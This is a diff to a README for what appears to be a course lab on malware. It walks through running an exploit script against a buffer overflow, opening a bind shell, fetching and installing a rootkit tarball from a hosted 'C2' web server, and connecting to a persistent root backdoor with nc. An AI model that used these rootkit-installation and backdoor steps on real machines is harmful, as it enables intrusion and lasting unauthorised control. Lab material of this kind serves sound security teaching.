@@ -2,114 +2,101 @@
 
 ## Project Layout
 
-`rootkit/` - contains source code for malicious rootkit library 
-`dropper/` - contains vulnerable target program and payload delivery code
-`target/` - contains code for testing/target environment (will eventually be run on target server)
+`rootkit/` - source code for malicious rootkit library 
+`dropper/` - exploit code
+`target/` - target environment (run on target server)
 
-## Purpose
+## Overview
 
 This readme details the process for setting up your test environment, and installing your malware using an exploit script.
 
 In order to do install, you will run an exploit script which will exploit a buffer overflow in the target process.
-This will open up a temporary bind shell into the process which you can use to install your rootkit onto the system.
+This will open up a temporary bind shell into the process which the exploit script will use to install the rootkit on the target machine.
 
-This will give you a more permenant backdoor, and also allow you to use all of your features in the coming weeks, as you
-add more.
+For a copy of these instructions see https://mw-demo.roryhemmings.com
 
-## Test Target Environment Setup
+## Exploitation
 
-Perform all these steps in the vm in the **target/ directory**
+**Perform these steps in the *dropper/* directory**
+They can be done on any linux machine with this repo downloaded.
+
+Before doing so, message me with your rootkit tarball so I can host it for you on my static webserver.
+
+This tarball can be created by running the following commands in the ***rootkit/* directory**
+
+```sh
+make
+make dist
+```
+
+### Steps
+1. Update the target number (this will be assigned to you) in exploit.py and backdoor.sh
+
+exploit.py
+```py
+'''
+Set the below target number to your assigned target number to automate the installation process
+'''
+target_num = #
+
+# ---------------------------------
+...
+```
+
+backdoor.sh
+```sh
+#!/bin/bash
+
+TARGET_NUM=#
+...
+```
+
+2. Run your exploit
+```sh
+python3 exploit.py
+```
+
+3. Open the backdoor
+```sh
+chmod +x backdoor.sh        # give exec perms if you haven't already
+./backdoor.sh
+```
+
+This will prompt you for a password. You can leave it blank as the backdoor has already been opened.
+
+4. Connect to your persistent backdoor (in another terminal window)
+```sh
+nc mw-demo.roryhemmings.com PORT
+```
+
+In this case, replace the `PORT` with your assigned backdoor port
+After doing this you will have root access to the machine, and you can do whatever you want.
+
+For example, if you go the link `http://mw-demo.roryhemmings.com:WEB_PORT` where `WEB_PORT` is your assigned web port, it will take you the static site hosted by your machine.
+
+The static files served by this machine are in `/var/www/html` if you would like to modify them. However, keep in mind, you don't have access to any text editors, so you will likely have to use shell commands like echo.
+
+## Target Environment Setup (optional)
+
+Only perform these steps if you would like to test your rootkit locally.
+
+Perform all these steps in the vm in the ***target/* directory**
 
 1. install docker
 
 ```sh
 curl -fsSL https://get.docker.com -o get-docker.sh
 sh get-docker.sh
+
+sudo apt install docker-compose
 ```
 
-2. disable ssh
-
-```sh
-sudo systemctl stop sshd
-```
-
-3. disable aslr
+2. disable aslr
 
 ```sh
 sudo echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
-4. install and enable apache
 
-```sh
-sudo apt install apache2
-```
+3. run `sudo make setup`
 
-5. Install `pip` and `pwntools`
-
-```sh
-sudo apt-get install python3-pip
-pip3 install pwntools
-```
-
-6. Install `docker-compose`.
-
-```sh
-sudo apt install docker-compose
-```
-
-7. run `sudo docker compose up -d`
-
-## Malware Installation Process
-
-Preform these steps in the **dropper/ directory** 
-
-### Set up C2
-
-1. create rootkit tarball
-> make sure you compile your rootkit and move the rootkit.so file to the 
-
-```sh
-tar -czf rootkit.tz drop.sh rootkit.so
-```
- 
-2. move the rootkit tarball to /var/www/html ("C2 server")
-
-```sh
-cp rootkit.tz /var/www/html
-```
-
-### Run the exploit 
-
-1. run your exploit, it will hang, let it do so
-
-```sh
-python3 exploit.py
-```
-
-2. in a separate terminal connect to localhost:4567 via `nc` (stage 1 bind shell)
-3. download and unzip your tarball. To find your local IP address, run `ifconfig` and copy and paste the first IP address.
-
-```sh
-wget http://<your_ip_address>/rootkit.tz
-tar -xzf rootkit.tz
-```
-
-4. install your malware
-
-```sh
-chmod +x drop.sh 
-./drop.sh (installs your malware)
-```
-
-5. ssh into trigger address
-```sh
-ssh joebruin@localhost
-```
-
-6. open bind shell (nc localhost 1234)
-
-```sh
-nc localhost 1234
-```
-
-7. Hack Away - your malware is running in the docker container
+after doing so, you can run `sudo make shell` to open a shell in the docker container, or `sudo make clean` to take down the target environment.
